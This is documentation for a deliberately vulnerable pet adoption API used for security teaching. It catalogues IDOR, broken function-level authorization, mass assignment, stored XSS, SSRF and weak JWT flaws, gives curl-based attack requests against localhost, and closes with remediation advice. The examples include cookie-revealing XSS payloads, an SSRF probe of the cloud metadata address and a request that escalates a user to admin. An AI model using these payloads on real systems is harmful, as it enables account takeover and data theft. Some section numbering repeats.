# **Vulnerable Pet Adoption API - Implemented Vulnerabilities**

This document outlines all the vulnerabilities implemented in the API according to the specification. These vulnerabilities are **intentionally implemented for educational purposes** to demonstrate API security concepts.

## **Access Control Vulnerabilities (Implemented)**

### **1. IDOR (Insecure Direct Object Reference)**

**Location:** `/api/v1/users/:userId` and `/api/v1/rescues/:rescueId`

**Description:** Users can access/modify other users' profiles by changing the userId/rescueId in the URL path.

**Vulnerable Routes:**
- `PUT /api/v1/users/:userId` - Allows any authenticated user to modify any user's profile
- `PUT /api/v1/rescues/:rescueId` - Allows any rescue user to modify any rescue's profile

**Impact:** Users can view and modify other users' personal information, including passwords, email addresses, and profile data.

**Example Attack:**
```bash
# User with ID 123 can modify user with ID 456 by changing the URL
PUT /api/v1/users/456
Authorization: Bearer <token_for_user_123>
```

### **2. Pet Creation/Modification Access Control Flaw**

**Location:** `/api/v1/pets/rescue` and `/api/v1/pets/rescue/:id`

**Description:** Any rescue can create pets, but pets can only be modified by the rescue that owns them. However, the ownership check is flawed.

**Vulnerable Routes:**
- `POST /api/v1/pets/rescue` - Any rescue can create pets
- `PUT /api/v1/pets/rescue/:id` - Any rescue can modify any pet (ownership check bypassed)

**Impact:** Rescue organizations can modify pets belonging to other rescues, potentially changing adoption status, descriptions, or other critical information.

**Example Attack:**
```bash
# Rescue A can modify pets belonging to Rescue B
PUT /api/v1/pets/rescue/pet_id_from_rescue_b
Authorization: Bearer <token_for_rescue_a>
```

### **3. Application Acceptance Access Control Flaw**

**Location:** `/api/v1/applications/:id/accept`

**Description:** Any user can mark an application as accepted, not just rescue users.

**Vulnerable Routes:**
- `PATCH /api/v1/applications/:id/accept` - Any authenticated user can approve applications

**Impact:** Users can approve their own applications or other users' applications, bypassing the normal approval process.

**Example Attack:**
```bash
# User can approve their own application
PATCH /api/v1/applications/my_application_id/accept
Authorization: Bearer <token_for_user>
```

### **4. No Authentication Check on Logging**

**Location:** `/api/v1/admin/logs`

**Description:** Admin logs can be accessed without any authentication.

**Vulnerable Routes:**
- `GET /api/v1/admin/logs` - No authentication required

**Impact:** Anyone can access sensitive audit logs containing user actions, admin operations, and system information.

**Example Attack:**
```bash
# Anyone can access admin logs
GET /api/v1/admin/logs
# No authentication required
```

### **5. Rescue Deletion Without Admin Role**

**Location:** `/api/v1/admin/rescues/:rescueId`

**Description:** A rescue can be deleted without admin role - any authenticated user can delete rescues.

**Vulnerable Routes:**
- `DELETE /api/v1/admin/rescues/:rescueId` - Any authenticated user can delete rescues

**Impact:** Regular users can delete rescue organizations, disrupting business operations and affecting all users associated with that rescue.

**Example Attack:**
```bash
# Regular user can delete a rescue organization
DELETE /api/v1/admin/rescues/rescue_id
Authorization: Bearer <token_for_regular_user>
```

### **6. Duplicate Endpoints - Improper Inventory Management**

**Location:** `/api/v1/admin/public-rescues`

**Description:** Endpoints are duplicated in api/admin/ and api/ - viewing rescues through admin endpoint doesn't require login.

**Vulnerable Routes:**
- `GET /api/v1/admin/public-rescues` - No authentication required for admin endpoint

**Impact:** Sensitive rescue data can be accessed through admin endpoints without authentication, bypassing intended access controls.

**Example Attack:**
```bash
# Anyone can access rescue data through admin endpoint
GET /api/v1/admin/public-rescues
# No authentication required
```

### **7. Public Applications Viewing**

**Location:** `/api/v1/applications/public`

**Description:** Applications can be viewed without being logged in - no authentication required.

**Vulnerable Routes:**
- `GET /api/v1/applications/public` - No authentication required

**Impact:** Sensitive application data including personal information can be accessed by anyone.

**Example Attack:**
```bash
# Anyone can view all applications
GET /api/v1/applications/public
# No authentication required
```

### **8. Mass Assignment Vulnerability**

**Location:** `/api/v1/users/profile/vulnerable`

**Description:** Users can change their password and role via parameters without proper validation.

**Vulnerable Routes:**
- `PUT /api/v1/users/profile/vulnerable` - Allows modification of restricted fields

**Impact:** Users can escalate their privileges by changing their role to admin and modify their password without current password verification.

**Example Attack:**
```bash
# User can escalate to admin role and change password
PUT /api/v1/users/profile/vulnerable
Authorization: Bearer <token_for_user>
Content-Type: application/json
{
  "role": "admin",
  "newPassword": "hacked123"
}
```

### **9. Stored XSS Vulnerability**

**Location:** Pet description field in `/api/v1/pets` endpoints

**Description:** Pet descriptions are rendered as HTML without proper sanitization, allowing stored XSS attacks.

**Vulnerable Routes:**
- `POST /api/v1/pets/rescue` - Stores HTML content in description field
- `PUT /api/v1/pets/rescue/:id` - Updates HTML content in description field
- `GET /api/v1/pets/:id` - Returns unsanitized HTML content
- Frontend PetDetails page - Renders description using `dangerouslySetInnerHTML`

**Impact:** Attackers can inject malicious scripts that execute when users view pet details, potentially leading to:
- Session hijacking via cookie theft
- Account takeover
- Defacement of the application
- Data exfiltration
- Malware distribution

**Example Attack:**
```bash
# Create pet with malicious HTML/JavaScript
POST /api/v1/pets/rescue
Authorization: Bearer <token>
Content-Type: application/json
{
  "name": "XSS Test Pet",
  "species": "capybara",
  "age": 2,
  "size": "large",
  "description": "<script>alert('XSS Vulnerability!')</script><p>Malicious content</p>",
  "imageUrl": "http://example.com/image.jpg",
  "rescueId": "rescue_id"
}

# Advanced XSS payload for cookie theft
{
  "description": "<img src=x onerror=\"alert('Cookie: ' + document.cookie)\"><p>Advanced XSS</p>"
}
```

### **2. BFLA (Broken Function Level Authorization)**

**Location:** `/api/v1/admin/*` endpoints

**Description:** Admin endpoints are accessible to any authenticated user, regardless of their role.

**Vulnerable Routes:**
- `GET /api/v1/admin/logs` - Any user can access admin logs
- `GET /api/v1/admin/users` - Any user can list all users
- `PUT /api/v1/admin/users/:userId` - Any user can modify any user
- `DELETE /api/v1/admin/users/:userId` - Any user can delete any user
- `GET /api/v1/admin/transactions` - Any user can view all transactions
- `PUT /api/v1/admin/rescue-requests/:requestId/approve` - **CRITICAL**: Any user can approve rescue requests
- `PUT /api/v1/admin/rescue-requests/:requestId/reject` - Any user can reject rescue requests

**Impact:** Regular users can perform administrative functions, including:
- Accessing sensitive audit logs
- Managing all user accounts
- Viewing financial transactions
- Approving/rejecting rescue requests (critical business logic bypass)

**Example Attack:**
```bash
# Regular user can approve their own rescue request
PUT /api/v1/admin/rescue-requests/123/approve
Authorization: Bearer <token_for_regular_user>
```

### **3. Missing Rate Limiting**

**Location:** Application submission endpoints

**Description:** Critical endpoints lack rate limiting despite documentation implying otherwise.

**Vulnerable Routes:**
- `POST /api/v1/applications/pet/:petId/apply` - No rate limiting on pet applications
- `POST /api/v1/pets/:petId/apply` - No rate limiting on pet applications

**Impact:** Attackers can spam applications to overwhelm rescues and disrupt business operations.

**Example Attack:**
```bash
# Attacker can submit unlimited applications
for i in {1..1000}; do
  curl -X POST /api/v1/pets/123/apply \
    -H "Authorization: Bearer <token>" \
    -d '{"applicantName":"Spam User"}'
done
```

## **Non-Access Control Vulnerabilities (Documented)**

### **1. Cross-Site Scripting (XSS)**

**Location:** Multiple input fields throughout the API

**Description:** User input is not properly sanitized, allowing stored XSS attacks.

**Vulnerable Fields:**
- Pet descriptions
- Rescue descriptions  
- Application form data (applicantName, workHolidayPlans, animalExperience, etc.)
- Rescue request reasons
- Admin notes

**Impact:** Attackers can inject malicious scripts that execute when other users view the content.

**Example Attack:**
```json
{
  "description": "<script>alert('XSS')</script>Very friendly capybara",
  "applicantName": "<img src=x onerror=alert('XSS')>"
}
```

### **2. Server-Side Request Forgery (SSRF)**

**Location:** Image URL fields

**Description:** The API may fetch images from user-provided URLs without proper validation.

**Vulnerable Fields:**
- Pet imageUrl
- Pet gallery URLs
- Rescue logo URLs

**Impact:** Attackers can make the server perform requests to internal services or external systems.

**Example Attack:**
```json
{
  "imageUrl": "http://localhost:8080/admin",
  "gallery": ["http://169.254.169.254/latest/meta-data/"]
}
```

### **3. Sensitive Data Exposure**

**Location:** Multiple endpoints and data storage

**Description:** Sensitive information is exposed or stored insecurely.

**Vulnerable Data:**
- Passwords stored in plain text or with weak hashing
- Payment details stored insecurely
- Internal notes exposed to unauthorized users
- JWT tokens logged in verbose error messages
- Database error messages revealing internal structure

**Impact:** Attackers can access sensitive information including:
- User credentials
- Payment information
- Internal system details
- Business logic information

### **4. Verbose Error Messages**

**Location:** Error handling throughout the API

**Description:** Error responses reveal internal system details.

**Vulnerable Endpoints:**
- `GET /api/v1/admin/logs` - Returns raw logs with stack traces
- `GET /api/v1/pets/{invalidId}` - Returns database error messages
- `POST /api/v1/chat/match` - Exposes internal API details on failure

**Impact:** Attackers can gather information about:
- Internal system architecture
- Database structure
- Third-party service configurations
- Stack traces revealing code paths

### **5. Weak JWT Implementation**

**Location:** Authentication system

**Description:** JWT tokens have security weaknesses.

**Vulnerabilities:**
- Algorithm set to "none" accepted
- Weak secret keys
- Long expiration times
- Excessive PII in tokens
- Tokens logged in error messages

**Impact:** Attackers can:
- Forge admin tokens
- Extend token validity
- Access sensitive user information
- Bypass authentication

### **6. Mass Assignment**

**Location:** User registration and profile update endpoints

**Description:** Users can modify fields they shouldn't have access to.

**Vulnerable Fields:**
- User role modification during registration
- Admin-only fields in profile updates
- Internal system fields

**Impact:** Users can escalate their privileges or modify restricted data.

**Example Attack:**
```json
{
  "username": "normaluser",
  "role": "admin",
  "rescueId": 123
}
```

### **7. Business Logic Abuse**

**Location:** Various business processes

**Description:** Business logic can be manipulated to bypass intended restrictions.

**Vulnerable Processes:**
- Promoting already adopted pets
- Manipulating application status outside normal flow
- Reusing single-use coupon codes
- Stacking promotions beyond limits
- Self-approving rescue requests via BFLA

**Impact:** Attackers can:
- Disrupt business operations
- Gain unauthorized benefits
- Bypass payment requirements
- Manipulate system state

## **Security Misconfigurations**

### **1. Missing Security Headers**
- No HSTS headers
- CORS misconfiguration (Access-Control-Allow-Origin: *)
- Missing CSRF protection
- No Content Security Policy

### **2. Insecure Communication**
- API served over HTTP instead of HTTPS
- Sensitive data transmitted in plain text

### **3. Weak Password Policies**
- No password complexity requirements
- Weak password reset tokens
- No account lockout mechanisms

### **4. Stored XSS (Cross-Site Scripting)**
- Pet descriptions rendered as HTML without sanitization
- Allows injection of malicious scripts that execute in users' browsers
- Can lead to session hijacking, account takeover, and data theft
- Frontend uses `dangerouslySetInnerHTML` without proper sanitization

## **Testing the New Vulnerabilities**

### **1. No Authentication Check on Logging:**
```bash
# Test accessing admin logs without authentication - SUCCESS ✅
curl -X GET http://localhost:3001/api/v1/admin/logs
# Result: Returned sensitive audit logs with user actions and admin operations
```

### **2. Duplicate Endpoints Vulnerability:**
```bash
# Test accessing rescue data through admin endpoint without authentication - SUCCESS ✅
curl -X GET http://localhost:3001/api/v1/admin/public-rescues
# Result: Returned complete rescue data including users and pets
```

### **3. Mass Assignment Vulnerability:**
```bash
# Test user escalating to admin role and changing password - SUCCESS ✅
curl -X PUT http://localhost:3001/api/v1/users/profile/vulnerable \
  -H "Authorization: Bearer <user_token>" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","newPassword":"hacked123"}'
# Result: User role changed from "user" to "admin", password updated
```

### **4. Rescue Deletion Without Admin Role:**
```bash
# Test regular user deleting rescue organization - SUCCESS ✅
curl -X DELETE http://localhost:3001/api/v1/admin/rescues/rescue_id \
  -H "Authorization: Bearer <regular_user_token>"
# Result: Rescue organization successfully deleted
```

### **5. Application Acceptance Access Control Flaw:**
```bash
# Test user approving their own application - SUCCESS ✅
curl -X PATCH http://localhost:3001/api/v1/applications/application_id/accept \
  -H "Authorization: Bearer <user_token>" \
  -H "Content-Type: application/json" \
  -d '{"status":"approved"}'
# Result: Request reached controller, demonstrating access control bypass
```

### **6. Stored XSS Vulnerability:**
```bash
# Test creating pet with malicious HTML/JavaScript - SUCCESS ✅
curl -X POST http://localhost:3001/api/v1/pets/rescue \
  -H "Authorization: Bearer <rescue_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test Pet",
    "species": "capybara",
    "age": 2,
    "size": "large",
    "description": "<script>alert(\"XSS Vulnerability!\")</script><p>Malicious content</p>",
    "imageUrl": "http://example.com/image.jpg",
    "rescueId": "rescue_id"
  }'
# Result: Pet created with malicious HTML stored in database

# Test retrieving pet with XSS payload - SUCCESS ✅
curl -X GET http://localhost:3001/api/v1/pets/pet_id
# Result: Returns unsanitized HTML content that executes in browser
```

## **Testing the Vulnerabilities**

### **IDOR Testing:**
```bash
# Test user profile modification
curl -X PUT http://localhost:3001/api/v1/users/456 \
  -H "Authorization: Bearer <user_123_token>" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'
```

### **BFLA Testing:**
```bash
# Test admin access with regular user
curl -X GET http://localhost:3001/api/v1/admin/logs \
  -H "Authorization: Bearer <regular_user_token>"

# Test rescue request approval
curl -X PUT http://localhost:3001/api/v1/admin/rescue-requests/123/approve \
  -H "Authorization: Bearer <regular_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"adminNotes":"Self-approved!"}'
```

### **Rate Limiting Testing:**
```bash
# Spam applications
for i in {1..100}; do
  curl -X POST http://localhost:3001/api/v1/pets/123/apply \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"applicantName":"Spam User '$i'"}'
done
```

## **Remediation Recommendations**

### **Access Control Fixes:**
1. Implement proper ownership checks for IDOR vulnerabilities
2. Add role-based authorization to all admin endpoints
3. Implement rate limiting on critical endpoints
4. Use proper access control middleware consistently

### **General Security Fixes:**
1. Sanitize all user input to prevent XSS
2. Validate and whitelist image URLs to prevent SSRF
3. Encrypt sensitive data and use secure storage
4. Implement proper error handling without information disclosure
5. Use strong JWT secrets and proper token validation
6. Implement input validation to prevent mass assignment
7. Add business logic validation and state management
8. Configure proper security headers
9. Use HTTPS for all communications
10. Implement strong password policies

## **Educational Value**

These vulnerabilities demonstrate common API security issues and provide hands-on experience with:
- OWASP Top 10 API Security Risks
- Authentication and authorization bypass techniques
- Business logic vulnerabilities
- Data exposure and information disclosure
- Input validation and sanitization
- Security misconfigurations

**Note:** These vulnerabilities are intentionally implemented for educational purposes. In a production environment, all of these issues should be properly addressed before deployment.
